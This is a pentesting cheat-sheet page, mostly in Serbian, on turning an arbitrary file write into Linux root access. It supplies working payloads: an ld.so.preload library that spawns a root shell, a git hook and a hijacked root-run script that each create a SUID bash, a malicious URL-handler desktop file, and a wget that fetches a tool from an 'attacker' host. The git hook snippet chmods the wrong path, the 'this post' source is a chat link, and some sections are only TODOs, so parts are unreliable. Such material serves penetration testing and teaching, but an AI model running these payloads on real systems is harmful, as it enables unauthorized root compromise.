# Arbitrary File Write to Root

{{#include ../../banners/hacktricks-training.md}}

### /etc/ld.so.preload

Ovaj fajl se ponaša kao promenljiva okruženja **`LD_PRELOAD`**, ali takođe radi i u **SUID binaries**.\
Ako možete da ga kreirate ili izmenite, možete jednostavno dodati **putanju do biblioteke koja će biti učitana** pri svakom izvršavanju binarnog fajla.

Na primer: `echo "/tmp/pe.so" > /etc/ld.so.preload`
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unlink("/etc/ld.so.preload");
setgid(0);
setuid(0);
system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
### Git hooks

[**Git hooks**](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks) su **scripts** koji se **run** na raznim **events** u git repozitorijumu, kao kada se kreira commit, merge... Dakle, ako **privileged script or user** često izvodi ove radnje i moguće je **write in the `.git` folder`**, ovo se može iskoristiti za **privesc**.

Na primer, moguće je **generate a script** u git repo-u u **`.git/hooks`** tako da se uvek izvršava kada se kreira novi commit:
```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/b' > pre-commit
chmod +x pre-commit
```
### Cron & Time files

TODO

### Service & Socket files

TODO

### binfmt_misc

Fajl koji se nalazi u `/proc/sys/fs/binfmt_misc` pokazuje koji binarni program treba da izvrši koji tip fajlova. TODO: proveriti zahteve za zloupotrebu ovog mehanizma da bi se izvršio rev shell kada je otvoren uobičajen tip fajla.

### Overwrite schema handlers (like http: or https:)

Napadač koji ima write privilegije nad konfiguracionim direktorijumima žrtve može lako zameniti ili kreirati fajlove koji menjaju ponašanje sistema, što rezultira nenamernim izvršavanjem koda. Izmenom fajla `$HOME/.config/mimeapps.list` tako da HTTP i HTTPS URL handleri pokazuju na maliciozni fajl (npr. postavljanjem `x-scheme-handler/http=evil.desktop`), napadač obezbeđuje da **klik na bilo koji http ili https link pokreće kod naveden u tom `evil.desktop` fajlu**. Na primer, nakon postavljanja sledećeg malicioznog koda u `evil.desktop` u `$HOME/.local/share/applications`, svaki klik na eksterni URL pokreće ugrađenu komandu:
```bash
[Desktop Entry]
Exec=sh -c 'zenity --info --title="$(uname -n)" --text="$(id)"'
Type=Application
Name=Evil Desktop Entry
```
Za više informacija pogledajte [**ovaj post**](https://chatgpt.com/c/67fac01f-0214-8006-9db3-19c40e45ee49) u kojem je korišćen za iskorišćavanje stvarne ranjivosti.

### Root koji izvršava skripte/binarne datoteke zapisive od strane korisnika

Ako privilegovani workflow pokreće nešto poput `/bin/sh /home/username/.../script` (ili bilo koji binary unutar direktorijuma koji je u vlasništvu neprivilegovanog korisnika), možete ga preoteti:

- **Otkrivanje izvršenja:** nadgledajte procese pomoću [pspy](https://github.com/DominicBreuker/pspy) da biste uhvatili root koji poziva putanje pod kontrolom korisnika:
```bash
wget http://attacker/pspy64 -O /dev/shm/pspy64
chmod +x /dev/shm/pspy64
/dev/shm/pspy64   # wait for root commands pointing to your writable path
```
- **Potvrdite mogućnost pisanja:** osigurajte da su i ciljna datoteka i njen direktorijum u vlasništvu i upisivi od strane vašeg korisnika.
- **Preotmite cilj:** napravite backup originalnog binary/script i ubacite payload koji kreira SUID shell (ili neku drugu root akciju), zatim vratite permisije:
```bash
mv server-command server-command.bk
cat > server-command <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootshell
chown root:root /tmp/rootshell
chmod 6777 /tmp/rootshell
EOF
chmod +x server-command
```
- **Pokrenite privilegovanu radnju** (npr., pritiskom na UI dugme koje pokreće helper). Kada root ponovo izvrši hijacked path, preuzmite escalated shell pomoću `./rootshell -p`.

## References

- [HTB Bamboo – hijacking a root-executed script in a user-writable PaperCut directory](https://0xdf.gitlab.io/2026/02/03/htb-bamboo.html)

{{#include ../../banners/hacktricks-training.md}}
